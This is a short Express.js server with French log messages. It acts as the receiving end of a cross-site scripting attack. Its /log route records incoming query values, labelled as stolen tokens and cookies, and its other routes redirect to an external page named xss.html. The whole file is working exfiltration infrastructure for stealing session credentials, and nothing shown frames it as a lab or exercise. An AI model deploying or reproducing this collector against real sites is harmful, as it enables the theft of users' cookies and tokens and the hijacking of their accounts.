const express = require('express');
const app = express();

app.get('/log', (req, res) => {
  
  const query = req.query;

  if (query.token) {
    console.log('[+] Token volé:', query.token);
  } else if (query.cookie) {
    console.log('[+] Cookie volé:', query.cookie);
  } else {
    console.log('[+] Données reçues:', req.url);
  }

  res.send('Données reçues, merci !');
});

app.get('/', (req, res) => {
  res.redirect('https://aket0.github.io/xss-front/xss.html');
});

app.get('/xss', (req, res) => {
  res.redirect('https://aket0.github.io/xss-front/xss.html');
});

app.listen(5000, '0.0.0.0', () => {
  console.log('Serveur de logs démarré sur http://0.0.0.0:5000');
});
